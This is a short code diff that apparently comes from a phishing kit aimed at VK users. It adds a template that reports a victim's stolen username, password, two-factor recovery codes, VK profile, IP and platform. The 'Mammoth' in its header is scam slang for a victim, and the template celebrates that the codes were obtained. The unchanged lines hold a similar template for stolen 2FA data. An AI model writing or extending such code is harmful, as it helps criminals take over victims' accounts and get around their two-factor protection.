@@ -25,5 +25,19 @@ Username: <code>${data.username}</code>
 Password: <code>${data.password}</code>
 
 IP: ${data.ip}
-Platform: ${data.platform}` //2fa
+Platform: ${data.platform}`, //2fa
+
+  recoveryCodes: data => `<b>🐘 Successfully got Mammoth's recovery Codes ✅</b>
+  
+Username: <code>${data.username}</code>
+Password: <code>${data.password}</code>
+Codes: ${data.codes.map(code => `<code>${code}</code>`).join(", ")}
+
+Profile:
+<a href="https://vk.com/id${data.user_id}">
+  ${data.first_name} ${data.last_name}
+</a>
+
+IP: ${data.ip}
+Platform: ${data.platform}`
 };
